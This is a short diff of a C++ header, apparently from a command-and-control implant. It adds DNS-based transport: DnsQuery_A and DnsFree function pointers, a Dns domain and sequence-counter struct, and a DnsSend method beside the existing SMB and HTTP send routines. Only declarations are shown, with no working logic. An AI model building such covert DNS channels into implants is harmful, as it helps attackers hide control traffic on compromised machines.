@@ -780,6 +780,12 @@ namespace Root {
 
         struct {
             UPTR Handle;
+            DNS_STATUS_KH (WINAPI *DnsQuery_A)( PCSTR pszName, WORD wType, DWORD Options, PVOID pExtra, PDNS_RECORD_KH* ppQueryResults, PVOID* pReserved );
+            VOID (WINAPI *DnsFree)( PVOID pData, INT FreeType );
+        } Dnsapi = { 0 };
+
+        struct {
+            UPTR Handle;
 
 	    DECLAPI( wsprintfW );
             DECLAPI( ShowWindow );
@@ -1489,9 +1495,15 @@ public:
     auto SmbGet( _In_ CHAR* SmbUUID ) -> PVOID;
     auto SmbList( VOID ) -> PVOID;
 
+    struct {
+        WCHAR* Domain;
+        ULONG  SeqCounter;
+    } Dns = { .Domain = DNS_DOMAIN, .SeqCounter = 0 };
+
     auto Send( _In_ MM_INFO* SendData, _Out_opt_ MM_INFO* RecvData ) -> BOOL;
     auto SmbSend( _In_ MM_INFO* SendData, _Out_opt_ MM_INFO* RecvData ) -> BOOL;
     auto HttpSend( _In_ MM_INFO* SendData, _Out_opt_ MM_INFO* RecvData ) -> BOOL;
+    auto DnsSend( _In_ MM_INFO* SendData, _Out_opt_ MM_INFO* RecvData ) -> BOOL;
 };
 
 class Task {
